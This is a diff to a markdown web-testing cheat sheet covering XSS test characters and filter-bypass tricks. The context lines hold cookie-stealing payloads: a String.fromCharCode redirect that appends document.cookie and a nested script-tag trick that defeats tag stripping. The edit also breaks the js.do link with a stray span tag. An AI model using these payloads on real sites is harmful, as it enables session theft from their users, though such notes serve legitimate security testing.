@@ -52,7 +52,17 @@
 
 ### Other test methods
 
-* Test strings: >,',<,",//,:,=,;,!,--
+* Test strings: 
+    * >,
+    * ',
+    * <,
+    * ",
+    * //,
+    * :,
+    * =,
+    * ;
+    * !
+    * --
 * Fuzzing
 
 ### Bypassing filters
@@ -62,7 +72,7 @@
 * If special characters are filtered, you cant write strings into a payload directly.
     * Use JavaScript functions like fromCharCopde() that translates numeric codes to ASCII chars.
     * <scrIPT> location=String.fromCharCode(104,116,...)+document.cookie;</srcIPT>
-    * Use http://js.do/
+    * Use h<span>ttp://js.do/
 * Sometimes applications remove tags once or a couple times.
     * <scrip<script>t> ... </scrip</script>t>
     * The inner script tags will be removed, but the outer ones will be brought together and execute.
